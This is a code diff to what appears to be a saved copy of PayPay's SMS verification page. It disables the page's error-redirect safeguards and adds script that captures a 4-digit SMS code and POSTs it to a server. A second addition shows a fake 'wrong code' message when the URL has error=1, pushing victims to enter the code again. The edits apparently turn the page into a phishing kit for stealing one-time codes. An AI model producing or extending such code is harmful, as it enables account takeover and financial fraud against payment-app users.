@@ -45,7 +45,8 @@
     <script>
       (function () {
         var apiPath10s = '/api/v1/custom-metrics/appLoadTimeout10S'
-        window.hasLoaded = true // ★変更: タイムアウト回避のため最初からtrueに
+        // エラーページに飛ばされるのを防ぐため最初からtrue
+        window.hasLoaded = true 
 
         function appMountHandler() {
           window.hasLoaded = true
@@ -69,7 +70,7 @@
           }
         }, 10000)
 
-        // ★変更: 30秒後のエラーページリダイレクトを無効化
+        // エラーページへのリダイレクトを無効化
         // setTimeout(function () {
         //   if (!window.hasLoaded) {
         //     window.location.href = '/error/general';
@@ -164,10 +165,7 @@
     <link rel="preload" fetchpriority="high" href="https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2" as="font" type="font/woff2" crossorigin="">
     <link rel="preload" fetchpriority="high" href="https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2" as="font" type="font/woff2" crossorigin="">
     <style>
-      #index-loading.hidden {
-        display: none;
-      }
-
+      #index-loading.hidden { display: none; }
       #index-loading {
         --primary-color: #ff0022;
         --secondary-color: #00adeb;
@@ -181,7 +179,6 @@
         justify-content: space-between;
         align-items: center;
       }
-
       #index-loading > div {
         width: 18px;
         height: 18px;
@@ -189,24 +186,24 @@
         border-radius: 100%;
         animation: sk-bouncedelay 1s infinite ease-in-out both;
       }
-
       #index-loading > div.bounce1 { animation-delay: 0.15s; }
       #index-loading > div.bounce2 { animation-delay: 0.3s; }
       #index-loading > div.bounce3 { animation-delay: 0.45s; }
       #index-loading > div.bounce4 { animation-delay: 0.6s; }
       #index-loading > div.bounce5 { animation-delay: 0.75s; }
-
       @keyframes sk-bouncedelay {
-        0%, 80%, 100% {
-          transform: scale(0.2);
-          background-color: #ff0022;
-          background-color: var(--primary-color);
-        }
-        40% {
-          transform: scale(1);
-          background-color: #00adeb;
-          background-color: var(--secondary-color);
-        }
+        0%, 80%, 100% { transform: scale(0.2); background-color: #ff0022; background-color: var(--primary-color); }
+        40% { transform: scale(1); background-color: #00adeb; background-color: var(--secondary-color); }
+      }
+      
+      /* エラーメッセージ表示用のCSSを追加 */
+      .custom-error-text {
+        color: #ed3242;
+        font-weight: bold;
+        font-size: 14px;
+        margin-top: 15px;
+        margin-bottom: 15px;
+        text-align: center;
       }
     </style>
     <script type="module" crossorigin="" src="./payapay_files/index-DCGw2xAh.js.ダウンロード"></script>
@@ -302,13 +299,27 @@
       })()
     </script>
 
-    <!-- ▼▼▼ ここから追加：POST送信処理 ▼▼▼ -->
+    <!-- ▼▼▼ ここから追加：エラー処理とPOST送信処理 ▼▼▼ -->
     <script>
       document.addEventListener('DOMContentLoaded', function() {
         const smsInput = document.getElementById('sms-input');
         const submitBtn = document.getElementById('sms-submit');
+        const otpContent = document.querySelector('.otp-content');
 
-        // 入力値を監視して、4桁入力されたらボタンを有効化する
+        // 1. URLパラメータに error=1 があるかチェックしてエラー表示
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === '1') {
+          const errorMsg = document.createElement('p');
+          errorMsg.className = 'custom-error-text';
+          errorMsg.textContent = '認証コードが間違っています。もう一度ご確認ください。';
+          
+          // ボタンの上あたりにエラーメッセージを挿入
+          if (otpContent) {
+            otpContent.parentNode.insertBefore(errorMsg, otpContent.nextSibling);
+          }
+        }
+
+        // 2. 入力値を監視して、4桁入力されたらボタンを有効化する
         smsInput.addEventListener('input', function() {
           if (this.value.length === 4) {
             submitBtn.disabled = false;
@@ -321,7 +332,7 @@
           }
         });
 
-        // ボタンがクリックされたらサーバーにPOST送信
+        // 3. ボタンがクリックされたらサーバーにPOST送信
         submitBtn.addEventListener('click', async function(e) {
           e.preventDefault(); // デフォルトの動作をキャンセル
           
